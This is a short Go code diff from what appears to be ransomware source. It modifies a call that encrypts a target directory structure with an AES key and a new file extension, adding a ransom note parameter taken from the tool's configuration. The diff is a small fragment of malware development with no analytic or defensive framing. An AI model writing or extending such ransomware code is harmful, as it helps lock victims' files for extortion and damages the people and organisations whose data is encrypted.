@@ -78,7 +78,7 @@ __________________________________________________
     // Encrypting directory structure
 	_, _, _, err = cjlib.EncryptDirectoryStructure(
 		*arg_directory, aeskey, *arg_exclude,
-		file_ext, *arg_norename, *arg_dryrun)
+		file_ext, config.Ransom_note, *arg_norename, *arg_dryrun)
 	if err != nil {
 		fmt.Printf("[-] %s\n", err.Error())
         os.Exit(1)
